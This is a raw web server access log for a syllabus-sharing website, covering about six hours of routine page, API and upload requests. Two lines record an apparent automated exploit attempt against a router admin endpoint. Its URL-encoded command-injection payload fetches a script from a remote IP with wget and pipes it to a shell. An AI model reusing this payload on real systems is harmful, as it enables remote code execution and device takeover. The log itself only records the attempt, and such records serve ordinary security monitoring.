::ffff:127.0.0.1 - - [31/Aug/2024:22:29:24 +0000] "POST /api/upload HTTP/1.1" 200 141 "-" "curl/7.88.1"
98.113.158.59 - - [31/Aug/2024:22:29:50 +0000] "GET /api/syllabi HTTP/1.1" 200 1297 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:22:29:51 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2024:22:33:09 +0000] "POST /api/upload HTTP/1.1" 200 145 "-" "curl/7.88.1"
98.113.158.59 - - [31/Aug/2024:22:33:31 +0000] "GET /api/syllabi HTTP/1.1" 200 1443 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:22:33:32 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:22:34:08 +0000] "POST /api/upload HTTP/1.1" 200 160 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:22:42:36 +0000] "GET /api/syllabi HTTP/1.1" 200 1604 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:03:11 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:03:12 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:08:58 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:14:38 +0000] "GET /api/syllabi HTTP/1.1" 200 1155 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:14:45 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:19:20 +0000] "POST /api/upload HTTP/1.1" 200 159 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:32:03 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:32:03 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:32:04 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:32:05 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:32:05 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:32:05 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:32:05 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:32:06 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [31/Aug/2024:23:32:06 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
::1 - - [31/Aug/2024:23:33:06 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.171%3A88%2Ft%7Csh%3B%60) HTTP/1.1" 200 892 "-" "Go-http-client/1.1"
::1 - - [01/Sep/2024:01:14:17 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.171%3A88%2Ft%7Csh%3B%60) HTTP/1.1" 200 892 "-" "Go-http-client/1.1"
98.113.158.59 - - [01/Sep/2024:01:15:34 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:01:15:35 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:03:55:06 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:03:55:08 +0000] "GET /sw.js HTTP/1.1" 200 892 "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:03:55:12 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:03:55:14 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:03:55:17 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:03:55:47 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:03:55:48 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
2607:fb91:3203:c986:fc24:863c:abf:cd6f - - [01/Sep/2024:03:55:58 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.98 Mobile/15E148 Safari/604.1"
2607:fb91:3203:c986:fc24:863c:abf:cd6f - - [01/Sep/2024:03:56:13 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.98 Mobile/15E148 Safari/604.1"
2607:fb91:3203:c986:fc24:863c:abf:cd6f - - [01/Sep/2024:03:56:15 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.98 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:03:56:23 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.98 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:03:56:23 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
2607:fb91:3203:c986:fc24:863c:abf:cd6f - - [01/Sep/2024:03:56:31 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.98 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:03:58:02 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.98 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:03:58:07 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:03:58:09 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:03:58:43 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:03:58:51 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:03:52 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:05:03 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:05:22 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:05:24 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:05:30 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:05:39 +0000] "GET /api/syllabi HTTP/1.1" 200 1315 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:05:59 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:06:24 +0000] "POST /api/upload HTTP/1.1" 200 158 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:07:10 +0000] "POST /api/upload HTTP/1.1" 200 157 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:07:26 +0000] "GET /api/syllabi HTTP/1.1" 200 1632 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:07:27 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:07:27 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:07:29 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:08:04 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:20:08 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:20:09 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:20:10 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:20:10 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:20:10 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:20:10 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:20:11 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:20:11 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:20:12 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:20:50 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:20:57 +0000] "POST /api/upload HTTP/1.1" 200 160 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:21:03 +0000] "GET /api/syllabi/16 HTTP/1.1" 200 1497059 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:21:05 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:21:39 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:23:14 +0000] "POST /api/upload HTTP/1.1" 200 167 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:23:44 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:24:43 +0000] "POST /api/upload HTTP/1.1" 200 175 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:25:13 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:25:44 +0000] "POST /api/upload HTTP/1.1" 200 161 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:26:13 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:29:06 +0000] "GET /api/syllabi HTTP/1.1" 200 2137 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:29:08 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:29:53 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:30:48 +0000] "POST /api/upload HTTP/1.1" 200 184 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:31:18 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:35:52 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:36:12 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:36:14 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:36:50 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:39:07 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
2603:7000:c01:f769:79ec:94c4:7a6d:f3c0 - - [01/Sep/2024:04:39:08 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:04:39:09 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:39:12 +0000] "GET /apple-touch-icon.png HTTP/1.1" 200 892 "-" "com.apple.WebKit.Networking/19617.1.17.11.9 CFNetwork/1490.0.4 Darwin/23.2.0"
98.113.158.59 - - [01/Sep/2024:04:39:12 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 200 892 "-" "com.apple.WebKit.Networking/19617.1.17.11.9 CFNetwork/1490.0.4 Darwin/23.2.0"
98.113.158.59 - - [01/Sep/2024:04:39:43 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
2603:7000:c01:f769:79ec:94c4:7a6d:f3c0 - - [01/Sep/2024:04:39:49 +0000] "GET /api/syllabi/3 HTTP/1.1" 200 379405 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:04:41:33 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:41:35 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:42:04 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:42:05 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:42:06 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:42:41 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
2a04:4e41:18:9c::6647:69c9 - - [01/Sep/2024:04:44:28 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1"
